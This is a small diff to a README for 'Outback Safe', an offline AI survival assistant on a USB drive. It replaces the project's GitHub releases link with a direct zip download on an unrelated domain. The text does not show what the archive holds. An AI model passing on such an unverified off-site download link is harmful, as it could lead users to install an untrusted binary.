@@ -4,7 +4,7 @@
 
 A portable USB drive containing an offline AI assistant with RAG over 142 pages of Australian outback survival knowledge. **Zero internet required. No cloud dependencies. No data leaves the device.**
 
-> [Download the latest release](https://github.com/xnddzwkf5s-del/outback-safe/releases)
+> [Download Outback Safe.zip](https://wescan.net/downloads/Outback%20Safe.zip) — 79 MB, works offline immediately
 
 ---
 
